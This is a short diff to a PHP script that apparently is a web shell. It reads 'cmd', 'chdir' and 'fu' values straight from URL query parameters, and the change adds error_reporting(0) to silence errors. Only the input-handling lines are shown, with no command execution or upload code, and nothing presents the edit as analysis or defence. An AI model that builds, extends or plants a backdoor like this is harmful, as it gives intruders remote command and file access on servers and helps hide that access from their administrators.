@@ -1,5 +1,7 @@
 <?php
 
+error_reporting(0);
+
 if(empty($chdir)) $chdir = @$_GET['chdir'];
 if(empty($cmd)) $cmd = @$_GET['cmd'];
 if(empty($fu)) $fu = @$_GET['fu'];
